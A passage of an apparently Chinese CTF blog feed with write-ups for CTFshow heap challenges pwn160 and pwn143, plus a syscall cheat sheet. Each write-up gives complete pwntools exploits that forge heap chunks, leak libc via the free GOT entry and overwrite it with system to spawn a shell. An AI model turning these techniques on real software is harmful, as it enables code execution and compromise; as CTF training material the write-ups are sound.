        <content type="html"><![CDATA[<h1 id="CTFshow-pwn160-堆风水"><a href="#CTFshow-pwn160-堆风水" class="headerlink" title="CTFshow pwn160(堆风水)"></a>CTFshow pwn160(堆风水)</h1><h2 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h2><h3 id="main函数分析"><a href="#main函数分析" class="headerlink" title="main函数分析"></a>main函数分析</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3cbefdff92.png" alt="1741933551272.png"><br>1.简单的菜单题，通过menu，简单把函数名称修改，做一个简单的逆向</p><h3 id="add函数分析"><a href="#add函数分析" class="headerlink" title="add函数分析"></a>add函数分析</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3cc54920c5.png" alt="1741933652418.png"><br>1.通过add函数，要对堆块的储存结构有清晰的认知，这会影响甚至是决定我们攻击的手法。<br>2.可以看到每次add会申清两个堆块，一个大小由我们控制，一个大小固定为0x80。并且，大小自由的堆块的指针会被保存在，大小固定的那个堆块内。而大小固定的那个堆块的指针会被保存在heaplist(逆向重命名过)上。<br>3.input第一个参数是作为指针，所以他会写在v3上，位置是s指针后面。<br>4.然后这里调用edit去编辑堆块内容</p><h3 id="edit函数分析"><a href="#edit函数分析" class="headerlink" title="edit函数分析"></a>edit函数分析</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3d0bb5c4d7.png" alt="1741934774792.png"><br>1.看到这里对输入字节大小的检查，就可以联想到堆风水。是通过堆块的位置加上输入字节的大小，与另一块堆块的地址大小比较来判断。如果这两个堆块之间，有其他堆块，那么我们就可以对中间的堆块为所欲为了。</p><h3 id="show函数分析"><a href="#show函数分析" class="headerlink" title="show函数分析"></a>show函数分析</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3d1f5186f5.png" alt="1741935092305.png"><br>1.唯一的作用就是泄露libc</p><h3 id="delete函数分析"><a href="#delete函数分析" class="headerlink" title="delete函数分析"></a>delete函数分析</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3d22ae54bb.png" alt="1741935146434.png"><br>1.没有uaf，不能直接利用</p><h3 id="gdb分析"><a href="#gdb分析" class="headerlink" title="gdb分析"></a>gdb分析</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d3cfb254f83.png" alt="1741934513485.png"><br>1.通过gdb，可以对堆块的内容，结构有更清晰的观察和了解</p><h2 id="构造思路"><a href="#构造思路" class="headerlink" title="构造思路"></a>构造思路</h2><p>1.首先确定攻击的手法——堆风水.也就是要造成我们申清的堆块在最上方，add自动申清的堆块在最下方。此时我们就可以控制中间的堆块了.而0x80大小，会被放入unsortedbin中，满足先进先出的规则。那么我们先申请几个堆块，小于0x80。free掉堆块0，再add一个0x80大小的堆块，它会在从unsortedbin中取出之前的堆块给我们，同时从topchunk中分配出另一块。至此，一块低地址，一块高地址的堆块构造完成。<br>2.第二部对照gdb，把对应位置出的内容修改成free_got就可以通过show泄露libc.然后再通过edit修改got表内容。<br>3.最后delete一块内容为<code>/bin/sh\x00</code>的堆块就可以打通了.</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><h3 id="比较复杂的解法"><a href="#比较复杂的解法" class="headerlink" title="比较复杂的解法"></a>比较复杂的解法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">mode=<span class="number">1</span></span><br><span class="line">url=<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span></span><br><span class="line">port=<span class="number">28252</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> mode == <span class="number">0</span>:</span><br><span class="line">    io=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    io=remote(url,port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,name,lenth,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Action: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;size of description: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;name: &quot;</span>)</span><br><span class="line">    io.sendline(name)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;text length: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(lenth))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;text: &quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Action: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Action: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,lenth,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Action: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;text length: &quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(lenth))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;text: &quot;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&quot;a&quot;</span>,<span class="number">0x8</span>,<span class="string">b&#x27;hhhh&#x27;</span>)  <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&quot;b&quot;</span>,<span class="number">0x8</span>,<span class="string">b&#x27;hhhh&#x27;</span>)  <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&quot;c&quot;</span>,<span class="number">0x8</span>,<span class="string">b&#x27;hhhh&#x27;</span>)  <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&quot;d&quot;</span>,<span class="number">0x10</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)  <span class="comment">#3</span></span><br><span class="line">delete(<span class="number">2</span>)  </span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">b&quot;d&quot;</span>,<span class="number">0x40</span>,<span class="string">b&#x27;aaaa&#x27;</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;e&#x27;</span>,<span class="number">0x8</span>,<span class="string">b&#x27;bbbb&#x27;</span>)  <span class="comment">#5</span></span><br><span class="line">free_got=elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">payload=p32(<span class="number">0</span>)*<span class="number">5</span>+p32(<span class="number">0x89</span>)</span><br><span class="line">payload+=p32(<span class="number">0</span>)*<span class="number">16</span></span><br><span class="line">payload+=p32(<span class="number">0x88</span>)+p32(<span class="number">0x28</span>)</span><br><span class="line">payload+=p32(<span class="number">0</span>)*<span class="number">9</span>+p32(<span class="number">0x89</span>)</span><br><span class="line">payload+=p32(<span class="number">0</span>)*<span class="number">4</span></span><br><span class="line">payload+=p32(<span class="number">0x88</span>)+p64(<span class="number">0x29</span>)</span><br><span class="line">payload+=p32(<span class="number">0</span>)*<span class="number">8</span>+p32(<span class="number">0x89</span>)</span><br><span class="line">payload+=p32(free_got)</span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;description: &quot;</span>)</span><br><span class="line">free=u32(io.recv(<span class="number">4</span>))</span><br><span class="line">log.success(<span class="string">&#x27;free-&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(free)))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;free&quot;</span>,free)</span><br><span class="line">libcbase=free-libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">system=libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">0x4</span>,p32(system))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>现在看来，delete(2)似乎有点多余了</p>]]></content>
      
      
      <categories>
          
          <category> 做题笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> 堆风水 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFshow pwn143</title>
      <link href="/2025/06/22/heap/CTFshow%20pwn143/"/>
      <url>/2025/06/22/heap/CTFshow%20pwn143/</url>
      
        <content type="html"><![CDATA[<h1 id="CTFshow-pwn143-unlink-houce-of-force"><a href="#CTFshow-pwn143-unlink-houce-of-force" class="headerlink" title="CTFshow pwn143 (unlink &amp; houce of force)"></a>CTFshow pwn143 (unlink &amp; houce of force)</h1><h2 id="ida分析"><a href="#ida分析" class="headerlink" title="ida分析"></a>ida分析</h2><h3 id="main函数分析"><a href="#main函数分析" class="headerlink" title="main函数分析"></a>main函数分析</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2e78e7977a.png" alt="1741875084264.png"><br>1.经典菜单题<br>2.但是值得注意的是case 5 会调用v4[1] ，可以覆盖其中地址为题目留下的后门函数</p><h3 id="add函数分析"><a href="#add函数分析" class="headerlink" title="add函数分析"></a>add函数分析</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2e832e7df2.png" alt="1741875249112.png"><br>1.理清题目堆块指针的保存结构，使用list数组保存对应的堆块大小<br>2.使用heaplist数组，保存堆块的地址</p><h3 id="edit函数分析"><a href="#edit函数分析" class="headerlink" title="edit函数分析"></a>edit函数分析</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2e8f044392.png" alt="1741875438296.png"><br>1.发现溢出漏洞，可以溢出多字节</p><h3 id="show函数分析"><a href="#show函数分析" class="headerlink" title="show函数分析"></a>show函数分析</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2e9e693af7.png" alt="1741875684508.png"><br>1.没什么特别的，就是可以用来泄露libc</p><h3 id="delete函数分析"><a href="#delete函数分析" class="headerlink" title="delete函数分析"></a>delete函数分析</h3><p><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2eab191a39.png" alt="1741875887777.png"><br>1.没有漏洞，释放后将指针置空了</p><h2 id="构造思路"><a href="#构造思路" class="headerlink" title="构造思路"></a>构造思路</h2><p>1.首先这题在edit时留出了任意长度的溢出，但是没有uaf漏洞。所以这道题首先考虑unlink方法；同时这道题在case5 留出了一个v4给我们操作，那么如果可以通过某种方法申请到这块空间，就可以篡改为题目留下来的后门函数。这里可以使用house of force，也可以考虑fastbin dup吧，后续可以尝试。<br>2.那么确定攻击的方法之后，只需要注意几个点。如果采用unlink的手法，必须注意，伪造的fake_chunk的地址，必须是存放我们进行unlink操作的堆块的地址，如下图中所示。ptr就是存放堆块0的指针<br><img src="https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/67d2ee0282c68.png" alt="1741876735944.png"><br>3.此题使用unlink还要注意，堆块0的不能大于fastbin的大小，否则最后delete时会报错，不知道为什么。（待解决）明明unlink操作成功，修改free_got也成功，就是会报错。<br>4.如果使用house of force 的手法，那么只需要修改top的size，为-1(0xffffffffffffffff)。然后根据偏移，申清负数大小的堆块，是top_chunk迁移到目的地址(注意留出chunk头大小的空间)，然后申清就可以分配到这块空间。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><h3 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">mode=<span class="number">0</span></span><br><span class="line">url=<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span></span><br><span class="line">port=<span class="number">28159</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> mode == <span class="number">0</span>:</span><br><span class="line">    io=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    io=remote(url,port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,name</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;length:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,name</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;of name:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">flag=<span class="number">0x400D7F</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">b&#x27;aaaa&#x27;</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">b&#x27;bbbb&#x27;</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">b&#x27;cccc&#x27;</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>) <span class="comment">#3</span></span><br><span class="line">ptr=<span class="number">0x6020a8</span></span><br><span class="line">fd=ptr-<span class="number">0x18</span></span><br><span class="line">bk=ptr-<span class="number">0x10</span></span><br><span class="line">fake_chunk=p64(<span class="number">0</span>)+p64(<span class="number">0x61</span>)</span><br><span class="line">fake_chunk+=p64(fd)+p64(bk)</span><br><span class="line">fake_chunk+=p64(<span class="number">0</span>)*<span class="number">8</span></span><br><span class="line">fake_chunk+=p64(<span class="number">0x60</span>)+p64(<span class="number">0xa0</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(fake_chunk),fake_chunk)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x90</span>)+p64(elf.got[<span class="string">&#x27;free&#x27;</span>])</span><br><span class="line">edit(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">show()</span><br><span class="line">io.recv(<span class="number">4</span>)</span><br><span class="line">free=u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&quot;free-&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(free)))</span><br><span class="line">libc=LibcSearcher(<span class="string">&quot;free&quot;</span>,free)</span><br><span class="line">libcbase=free-libc.dump(<span class="string">&quot;free&quot;</span>)</span><br><span class="line">system=libcbase+libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x8</span>,p64(system))</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">mode=<span class="number">0</span></span><br><span class="line">url=<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span></span><br><span class="line">port=<span class="number">28197</span></span><br><span class="line">elf=ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> mode == <span class="number">0</span>:</span><br><span class="line">    io=process(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">    io=remote(url,port)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,name</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;length:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,name</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;of name:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    io.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">    io.send(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&quot;index:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_flag</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&quot;Your choice:&quot;</span>)</span><br><span class="line">    io.sendline(<span class="string">&quot;5&quot;</span>)</span><br><span class="line">flag=<span class="number">0x400D7F</span></span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">7</span>+p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x41</span>,payload)</span><br><span class="line"></span><br><span class="line">offset=-<span class="number">0x70</span></span><br><span class="line">add(offset,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">add(<span class="number">0x10</span>,p64(flag)*<span class="number">2</span>)</span><br><span class="line">get_flag()</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 做题笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> unlink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>系统调用号</title>
      <link href="/2025/03/24/syscall/syscall/"/>
      <url>/2025/03/24/syscall/syscall/</url>
      
        <content type="html"><![CDATA[<h1 id="syscall-知识梳理"><a href="#syscall-知识梳理" class="headerlink" title="syscall 知识梳理"></a>syscall 知识梳理</h1><h2 id="系统调用号"><a href="#系统调用号" class="headerlink" title="系统调用号"></a>系统调用号</h2><h3 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">read 3     eax=3  ebx=fd ecx=buf edx=size</span><br><span class="line">write 4    eax=4  ebx=fd ecx=buf edx=size</span><br><span class="line">open 5     eax=5  ebx=path ecx=flags edx=mode</span><br><span class="line">close 6    eax=6  ebx=fd</span><br><span class="line">execve 11  eax=0xb  ebx=&quot;/bin/sh\x00&quot; ecx=0 edx=0</span><br><span class="line"></span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure><h3 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">read 0     rax=0 rdi=fd rsi=buf rdx=size</span><br><span class="line">write 1    rax=1 rdi=fd rsi=buf rdx=size</span><br><span class="line">open 2     rax=2 rdi=patch rsi=flags rdx=mode</span><br><span class="line">close 3    rax=3 rdi=fd </span><br><span class="line">execve 59  rax=0x3b rdi=&quot;/bin/sh\x00&quot; rsi=0 rdx=0</span><br><span class="line"></span><br><span class="line">sys_call</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识梳理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> syscall </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/03/24/hello-world/"/>
      <url>/2025/03/24/hello-world/</url>
      
